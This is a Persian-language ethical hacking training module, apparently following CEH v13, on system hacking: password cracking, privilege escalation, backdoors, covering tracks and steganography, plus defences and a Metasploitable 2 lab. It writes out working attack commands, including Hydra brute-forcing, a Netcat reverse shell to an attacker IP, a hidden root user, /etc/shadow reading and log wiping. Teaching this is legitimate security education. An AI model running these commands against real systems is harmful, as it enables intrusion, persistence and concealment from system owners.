🔰 مقدمه – System Hacking چیست؟

System Hacking (هک سیستم) پنجمین و یکی از مهم‌ترین مراحل چرخه هک قانونمند است که پس از تحلیل آسیب‌پذیری انجام می‌شود. در این مرحله، هکر با استفاده از آسیب‌پذیری‌های شناسایی شده، سعی می‌کند به سیستم هدف نفوذ کرده و کنترل آن را به دست آورد.

System Hacking شامل مجموعه‌ای از تکنیک‌ها و مراحل است که به هکر امکان می‌دهد:

  • دسترسی (Gaining Access): نفوذ به سیستم با استفاده از آسیب‌پذیری‌ها.
  • افزایش دسترسی (Privilege Escalation): به‌دست آوردن سطح دسترسی بالاتر (معمولاً root/admin).
  • حفظ دسترسی (Maintaining Access): ایجاد راه‌های بازگشت به سیستم.
  • پاک کردن ردپا (Covering Tracks): حذف آثار حمله برای جلوگیری از شناسایی.
💡 نکته مهم: System Hacking قلب تپنده هک است. تمام مراحل قبلی (شناسایی، اسکن، شمارش، تحلیل آسیب‌پذیری) برای موفقیت در این مرحله انجام می‌شوند.

🔄 چرخه System Hacking

چرخه System Hacking شامل چهار مرحله اصلی است که هکر برای نفوذ و کنترل یک سیستم طی می‌کند:

🔓 ۱. دسترسی (Gaining Access)

  • هدف: نفوذ به سیستم از طریق آسیب‌پذیری‌های شناسایی شده.
  • روش‌ها: کرک پسورد، تزریق SQL، سرریز بافر، مهندسی اجتماعی، بهره‌برداری از آسیب‌پذیری‌های شناخته‌شده.
  • نتیجه: دسترسی به سیستم با سطح دسترسی محدود (معمولاً کاربر عادی).

📈 ۲. افزایش دسترسی (Privilege Escalation)

  • هدف: به‌دست آوردن دسترسی root/admin یا سطح دسترسی بالاتر.
  • روش‌ها: بهره‌برداری از آسیب‌پذیری‌های محلی، سوءاستفاده از تنظیمات اشتباه، کرک پسورد مدیر.
  • نتیجه: کنترل کامل بر سیستم.

🔗 ۳. حفظ دسترسی (Maintaining Access)

  • هدف: ایجاد دسترسی پایدار برای حملات آینده.
  • روش‌ها: نصب درب پشتی (Backdoor)، روت‌کیت (Rootkit)، ایجاد کاربران مخفی.
  • نتیجه: امکان بازگشت به سیستم در هر زمان.

🧹 ۴. پاک کردن ردپا (Covering Tracks)

  • هدف: حذف آثار حمله برای جلوگیری از شناسایی.
  • روش‌ها: پاک کردن لاگ‌ها، تغییر زمان‌ها، پنهان‌سازی فایل‌ها و فرآیندها.
  • نتیجه: مخفی‌ماندن حمله و جلوگیری از پیگرد قانونی.
💡 نکته: چرخه System Hacking یک فرآیند چرخه‌ای است و هکر ممکن است بارها بین مراحل مختلف حرکت کند.

🔑 کرک پسورد (Password Cracking)

کرک پسورد یکی از رایج‌ترین روش‌های دسترسی به سیستم است. در این روش، هکر سعی می‌کند با استفاده از ابزارها و تکنیک‌های مختلف، رمز عبور کاربران را پیدا کند.

📌 انواع حملات به پسورد:

  • حمله دیکشنری (Dictionary Attack): استفاده از یک لیست از کلمات رایج برای حدس رمز.
  • حمله Brute-Force: امتحان تمام ترکیب‌های ممکن کاراکترها.
  • حمله ترکیبی (Hybrid Attack): ترکیب دیکشنری با تغییرات (مثل اضافه کردن اعداد).
  • حمله جدول رنگین‌کمانی (Rainbow Table Attack): استفاده از جداول از پیش محاسبه‌شده برای هش‌ها.
  • حمله شنود (Sniffing): شنود ترافیک شبکه برای دریافت رمز عبور.
  • حمله مهندسی اجتماعی: فریب کاربر برای افشای رمز.
  • حمله Shoulder Surfing: مشاهده مستقیم صفحه‌کلید کاربر.

📌 مراحل کرک پسورد:

  1. جمع‌آوری هش‌ها: دریافت فایل هش پسوردها (مثل /etc/shadow در لینوکس یا SAM در ویندوز).
  2. انتخاب روش حمله: انتخاب روش مناسب بر اساس نوع هش و منابع موجود.
  3. اجرای حمله: استفاده از ابزارهای کرک برای پیدا کردن رمز.
  4. تأیید رمز: تست رمز پیدا شده برای ورود به سیستم.
⚠️ نکته اخلاقی: کرک پسورد بدون مجوز جرم است. در هک قانونمند، این کار فقط با مجوز و در محیط‌های کنترل‌شده انجام می‌شود.

در ادامه، مهم‌ترین حملات به پسورد را با جزئیات بیشتری بررسی می‌کنیم:

نوع حملهتوضیحمزایامعایب

💡 نکته: بهترین دفاع در برابر حملات پسورد، استفاده از رمزهای عبور قوی (طولانی، شامل حروف بزرگ و کوچک، اعداد و نمادها) و احراز هویت چندعاملی (MFA) است.

🛠️ ابزارهای کرک پسورد

ابزارهای متعددی برای کرک پسورد وجود دارند که هر کدام ویژگی‌ها و کاربردهای خاص خود را دارند:

Hashcat لینوکس، ویندوز، macOS Brute-Force، دیکشنری، ترکیبی، ماسک سریع‌ترین ابزار، پشتیبانی از GPU، بیش از ۳۰۰ نوع هش

# John the Ripper – کرک فایل shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Hashcat – کرک هش MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Hydra – Brute-Force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101

# Ncrack – Brute-Force RDP
ncrack -U users.txt -P pass.txt rdp://192.168.1.101
💡 نکته: Hashcat به دلیل پشتیبانی از GPU، سریع‌ترین ابزار کرک پسورد است و می‌تواند میلیاردها ترکیب را در ثانیه تست کند.

📈 افزایش دسترسی (Privilege Escalation)

پس از نفوذ اولیه به سیستم، هکر معمولاً دسترسی محدودی دارد (معمولاً یک کاربر عادی). افزایش دسترسی (Privilege Escalation) فرآیندی است که در آن هکر سعی می‌کند سطح دسترسی خود را به root/admin افزایش دهد.

📌 دو نوع افزایش دسترسی:

  • افقی (Horizontal): دسترسی به حساب کاربری دیگر با همان سطح دسترسی (مثلاً کاربر دیگر).
  • عمودی (Vertical): افزایش سطح دسترسی به root/admin.

📌 روش‌های افزایش دسترسی:

  • بهره‌برداری از آسیب‌پذیری‌های محلی: استفاده از آسیب‌پذیری‌های موجود در سیستم‌عامل یا برنامه‌ها.
  • سوءاستفاده از تنظیمات اشتباه: پیدا کردن فایل‌ها یا سرویس‌هایی که با دسترسی بالا اجرا می‌شوند.
  • کرک پسورد مدیر: پیدا کردن رمز عبور کاربر root/admin.
  • سوءاستفاده از Sudo: اگر کاربر مجوز اجرای دستورات خاصی با sudo را داشته باشد.
  • سوءاستفاده از Cron Jobs: پیدا کردن اسکریپت‌هایی که با دسترسی root اجرا می‌شوند.
  • سوءاستفاده از Docker یا LXC: در صورت وجود کانتینرها با دسترسی root.
# بررسی مجوزهای sudo
sudo -l

# جستجوی فایل‌های با SUID
find / -perm -4000 -type f 2>/dev/null

# جستجوی فایل‌های با SGID
find / -perm -2000 -type f 2>/dev/null

# بررسی Cron Jobs
cat /etc/crontab
ls -la /etc/cron.d/

# استفاده از ابزارهای خودکار مانند LinPEAS, WinPEAS
# (برای ویندوز) winpeas.exe
# (برای لینوکس) linpeas.sh
⚠️ نکته: افزایش دسترسی یکی از خطرناک‌ترین مراحل است، زیرا ممکن است باعث شناسایی هکر شود.

🔗 حفظ دسترسی (Maintaining Access)

پس از به‌دست آوردن دسترسی root/admin، هکر باید راهی برای بازگشت به سیستم ایجاد کند. این کار با نصب درب پشتی (Backdoor) یا روت‌کیت (Rootkit) انجام می‌شود.

📌 انواع درب پشتی:

  • شل معکوس (Reverse Shell): سیستم هدف به سرور هکر متصل می‌شود.
  • بایند شل (Bind Shell): یک پورت روی سیستم هدف باز می‌شود و هکر به آن متصل می‌شود.
  • Web Shell: یک فایل PHP/ASP که به هکر اجازه می‌دهد از طریق مرورگر به سیستم دسترسی داشته باشد.
  • SSH Backdoor: ایجاد یک کاربر مخفی با دسترسی SSH.
  • خدمات مخفی: نصب یک سرویس که در پس‌زمینه اجرا می‌شود.

📌 روت‌کیت (Rootkit):

  • تعریف: مجموعه‌ای از ابزارها برای پنهان‌سازی و حفظ دسترسی.
  • انواع: روت‌کیت‌های سطح کاربر، هسته، و بوت‌کیت.
  • کاربرد: پنهان‌سازی فایل‌ها، فرآیندها، لاگ‌ها و اتصالات شبکه.
  • ابزارها: Kbeast, SucKIT, Rootkit Hunter (برای تشخیص).
# ایجاد شل معکوس با Netcat (سمت هکر)
nc -lvnp 4444

# سمت هدف (با دسترسی root)
nc -e /bin/bash 192.168.1.100 4444

# ایجاد Web Shell (PHP)


# ایجاد کاربر مخفی در لینوکس
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hacker
echo "hacker:password" | chpasswd
⚠️ هشدار: روت‌کیت‌ها بسیار خطرناک هستند و می‌توانند امنیت سیستم را به شدت به خطر بیندازند.

🧹 پاک کردن ردپا (Covering Tracks)

آخرین مرحله System Hacking، پاک کردن ردپا است. هکر باید تمام آثار خود را از سیستم پاک کند تا توسط مدیران یا سیستم‌های تشخیص نفوذ شناسایی نشود.

📌 روش‌های پاک کردن ردپا:

  • پاک کردن لاگ‌ها: حذف یا تغییر لاگ‌های سیستم (مثل /var/log/ در لینوکس و Event Viewer در ویندوز).
  • تغییر زمان‌ها: تغییر زمان دسترسی و تغییر فایل‌ها.
  • پنهان‌سازی فایل‌ها: تغییر نام، تغییر پسوند، یا استفاده از ابزارهای Steganography.
  • پنهان‌سازی فرآیندها: استفاده از روت‌کیت برای پنهان کردن فرآیندها.
  • پاک کردن تاریخچه دستورات: حذف تاریخچه ترمینال (مثل history -c).
# پاک کردن لاگ‌های لینوکس
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages

# پاک کردن تاریخچه دستورات
history -c
rm -f ~/.bash_history

# پاک کردن لاگ‌های ویندوز (با PowerShell)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# تغییر زمان فایل
touch -t 202501011200 file.txt
💡 نکته: در هک قانونمند، پاک کردن ردپا فقط در محیط‌های آزمایشگاهی انجام می‌شود و در تست‌های واقعی، تمام آثار باید مستند شوند.

🖼️ پنهان‌سازی (Steganography)

Steganography هنر پنهان‌سازی اطلاعات درون فایل‌های دیگر (مثل تصاویر، صدا، ویدئو) است. این تکنیک برای انتقال اطلاعات به‌صورت مخفیانه استفاده می‌شود.

📌 انواع Steganography:

  • تصویری (Image): پنهان‌سازی داده درون تصاویر (JPG, PNG, BMP).
  • صوتی (Audio): پنهان‌سازی درون فایل‌های صوتی (MP3, WAV).
  • ویدیویی (Video): پنهان‌سازی درون فایل‌های ویدیویی.
  • متنی (Text): پنهان‌سازی درون فایل‌های متنی (با تغییر فاصله‌ها، حروف).
  • شبکه‌ای (Network): پنهان‌سازی درون بسته‌های شبکه.

📌 ابزارهای Steganography:

  • Steghide: پنهان‌سازی و استخراج داده درون تصاویر و صدا.
  • Outguess: پنهان‌سازی درون تصاویر JPEG.
  • OpenStego: ابزار متن‌باز برای Steganography.
  • StegOnline: ابزار آنلاین برای تحلیل و تشخیص Steganography.
  • Snow: پنهان‌سازی درون فایل‌های متنی با استفاده از فاصله‌ها.
# نصب steghide
sudo apt install steghide

# پنهان‌سازی یک فایل درون تصویر
steghide embed -cf image.jpg -ef secret.txt -sf output.jpg

# استخراج فایل از تصویر
steghide extract -sf output.jpg

# استفاده از Snow برای پنهان‌سازی در متن
snow -C -m "secret message" input.txt output.txt
💡 نکته: Steganography یک ابزار قدرتمند برای جاسوسی و انتقال اطلاعات محرمانه است، اما در هک قانونمند فقط برای آزمایش و آموزش استفاده می‌شود.

🤖 System Hacking با هوش مصنوعی

CEH v13 به عنوان اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده، ابزارها و تکنیک‌های مبتنی بر AI را برای System Hacking نیز معرفی می‌کند.

📌 نقش هوش مصنوعی در System Hacking:

  • بهینه‌سازی کرک پسورد: AI می‌تواند الگوهای رمزهای عبور را تحلیل کرده و حملات هوشمندتری انجام دهد.
  • تشخیص خودکار آسیب‌پذیری‌ها: AI می‌تواند به‌صورت خودکار آسیب‌پذیری‌های محلی را برای افزایش دسترسی شناسایی کند.
  • اتوماسیون حفظ دسترسی: AI می‌تواند بهترین روش حفظ دسترسی را بر اساس محیط هدف انتخاب کند.
  • پاک کردن هوشمند ردپا: AI می‌تواند لاگ‌ها و آثار حمله را به‌صورت هوشمندانه پاک کند.

📌 ابزارهای AI-Powered System Hacking:

  • AI-Powered Password Cracking: ابزارهایی که از یادگیری ماشین برای کرک پسورد استفاده می‌کنند.
  • AI-Based Privilege Escalation: ابزارهایی که به‌صورت خودکار راه‌های افزایش دسترسی را پیدا می‌کنند.
  • AI-Driven Backdoor Generation: تولید درب‌های پشتی هوشمند.
💡 چرا هوش مصنوعی در System Hacking مهم است؟

System Hacking با AI می‌تواند سرعت و دقت حملات را افزایش دهد و روش‌های پیشرفته‌تری را برای نفوذ و حفظ دسترسی ارائه دهد.

🛡️ راه‌های مقابله با System Hacking

برای جلوگیری از System Hacking، سازمان‌ها باید اقدامات زیر را انجام دهند:

📌 اقدامات کلی:

  • استفاده از رمزهای عبور قوی: طولانی، شامل حروف بزرگ و کوچک، اعداد و نمادها.
  • احراز هویت چندعاملی (MFA): اضافه کردن لایه‌های امنیتی بیشتر.
  • به‌روزرسانی منظم سیستم‌ها: نصب وصله‌های امنیتی.
  • محدود کردن دسترسی: اصل کمترین دسترسی (Least Privilege).
  • مانیتورینگ و لاگ‌گیری: ثبت و بررسی فعالیت‌های سیستم.
  • آموزش کارکنان: آگاهی‌بخشی درباره مهندسی اجتماعی و امنیت.

📌 اقدامات خاص:

  • در برابر کرک پسورد: استفاده از سالت (Salt) در هش‌ها، محدود کردن تعداد تلاش‌های ناموفق.
  • در برابر افزایش دسترسی: پیکربندی صحیح sudo، محدود کردن SUID/SGID.
  • در برابر حفظ دسترسی: استفاده از آنتی‌روت‌کیت، بررسی منظم سیستم.
  • در برابر پاک کردن ردپا: ذخیره لاگ‌ها در یک سرور امن، استفاده از SIEM.
⚠️ هشدار: هیچ سیستمی ۱۰۰٪ ایمن نیست، اما با اعمال این کنترل‌ها می‌توان ریسک را به شدت کاهش داد.

🧪 کارگاه عملی – System Hacking

در این کارگاه، شما یک سناریوی جامع System Hacking را روی یک هدف فرضی پیاده‌سازی می‌کنید. هدف این کارگاه، آشنایی عملی با تکنیک‌ها و ابزارهای System Hacking است.

🎯 هدف کارگاه:

  • نفوذ به سیستم با استفاده از یک آسیب‌پذیری.
  • کرک پسورد یک کاربر.
  • افزایش دسترسی به root.
  • نصب یک درب پشتی.
  • پاک کردن ردپا.

🖥️ محیط مورد نیاز:

  • حمله‌کننده: Kali Linux
  • هدف: Metasploitable 2
  • ابزارها: Nmap, Hydra, John the Ripper, Metasploit, Netcat

📝 سناریوی گام‌به‌گام:

مرحله ۱: شناسایی و اسکن

# اسکن پورت‌ها
nmap -sV -p- 192.168.1.101

تحلیل: پورت‌های باز مانند 21 (FTP), 22 (SSH), 80 (HTTP) را شناسایی کنید.

مرحله ۲: نفوذ از طریق FTP (vsftpd backdoor)

# استفاده از Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.101
exploit

تحلیل: پس از بهره‌برداری، یک شل با دسترسی root دریافت می‌کنید.

مرحله ۳: کرک پسورد با John the Ripper

# دریافت فایل shadow (با دسترسی root)
cat /etc/shadow

# کرک با John
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

تحلیل: رمز عبور کاربران را پیدا کنید.

مرحله ۴: نصب درب پشتی

# ایجاد یک شل معکوس با Netcat (سمت هکر)
nc -lvnp 4444

# سمت هدف (با دسترسی root)
nc -e /bin/bash 192.168.1.100 4444

تحلیل: با اجرای این دستور، هکر می‌تواند هر زمان به سیستم متصل شود.

مرحله ۵: پاک کردن ردپا

# پاک کردن لاگ‌ها
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# پاک کردن تاریخچه
history -c
rm -f ~/.bash_history

تحلیل: تمام آثار حمله پاک می‌شود.

⏳ تکلیف: تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند System Hacking تهیه کنید.

📝 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های System Hacking خود را تقویت کنید.

  • تمرین ۱ – کرک پسورد:
    با استفاده از John the Ripper، یک فایل shadow را کرک کنید و رمز عبور کاربران را پیدا کنید.
  • تمرین ۲ – Brute-Force SSH:
    با استفاده از Hydra، یک حمله Brute-Force به سرویس SSH یک دستگاه هدف انجام دهید.
  • تمرین ۳ – افزایش دسترسی:
    روی یک سیستم لینوکس، با استفاده از آسیب‌پذیری Dirty Cow، دسترسی خود را به root افزایش دهید.
  • تمرین ۴ – ایجاد درب پشتی:
    با استفاده از Netcat، یک شل معکوس ایجاد کنید و از آن برای اتصال مجدد به سیستم استفاده کنید.
  • تمرین ۵ – پنهان‌سازی:
    با استفاده از steghide، یک پیام مخفی را درون یک تصویر پنهان کنید و سپس آن را استخراج کنید.
  • تمرین ۶ – ترکیبی:
    یک سناریوی کامل System Hacking (نفوذ، افزایش دسترسی، حفظ دسترسی، پاک کردن ردپا) را روی Metasploitable 2 پیاده‌سازی کنید.

📖 واژه‌نامه تخصصی (Glossary)

در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره توضیح داده شده است.

واژه ساختار / مخفف تعریف ساده کاربرد در هک مثال
System Hacking — فرآیند نفوذ و کنترل یک سیستم هدف. دسترسی، افزایش دسترسی، حفظ دسترسی، پاک کردن ردپا. نفوذ به یک سرور لینوکس و گرفتن دسترسی root.
Privilege Escalation — افزایش سطح دسترسی در یک سیستم. به‌دست آوردن دسترسی root/admin. استفاده از آسیب‌پذیری Dirty Cow برای افزایش دسترسی.
Backdoor — یک راه مخفی برای دسترسی به سیستم. حفظ دسترسی پس از نفوذ. نصب یک Web Shell روی سرور.
Rootkit — مجموعه ابزارهای پنهان‌سازی و حفظ دسترسی. پنهان‌سازی فایل‌ها، فرآیندها و لاگ‌ها. استفاده از روت‌کیت برای پنهان کردن یک درب پشتی.
Password Cracking — فرآیند پیدا کردن رمز عبور از روی هش یا با حدس. دسترسی به حساب‌های کاربری. کرک فایل shadow با John the Ripper.
Dictionary Attack — حمله با استفاده از لیست کلمات رایج. پیدا کردن رمزهای ضعیف. استفاده از rockyou.txt برای کرک پسورد.
Brute-Force — حمله با امتحان تمام ترکیب‌های ممکن. پیدا کردن هر نوع رمز عبور. استفاده از Hashcat برای Brute-Force.
Rainbow Table — جداول از پیش محاسبه‌شده برای هش‌ها. کرک سریع هش‌ها. استفاده از RainbowCrack برای کرک هش MD5.
John the Ripper — ابزار کرک پسورد متن‌باز. کرک فایل‌های shadow و هش‌ها. john --wordlist=rockyou.txt shadow.txt
Hashcat — سریع‌ترین ابزار کرک پسورد با پشتیبانی از GPU. کرک انواع هش با سرعت بالا. hashcat -m 0 hash.txt rockyou.txt
Hydra — ابزار Brute-Force به سرویس‌های شبکه. حمله به SSH, FTP, HTTP و … hydra -l admin -P pass.txt ssh://192.168.1.1
Reverse Shell — شل که سیستم هدف به هکر متصل می‌شود. دور زدن فایروال و NAT. nc -e /bin/bash 192.168.1.100 4444
Bind Shell — شل که روی یک پورت گوش می‌دهد. دسترسی مستقیم به سیستم. nc -lvnp 4444 -e /bin/bash
Steganography — پنهان‌سازی اطلاعات درون فایل‌های دیگر. انتقال مخفیانه اطلاعات. پنهان‌سازی یک فایل درون تصویر با steghide.
Covering Tracks — پاک کردن آثار حمله. جلوگیری از شناسایی. پاک کردن لاگ‌ها و تاریخچه دستورات.
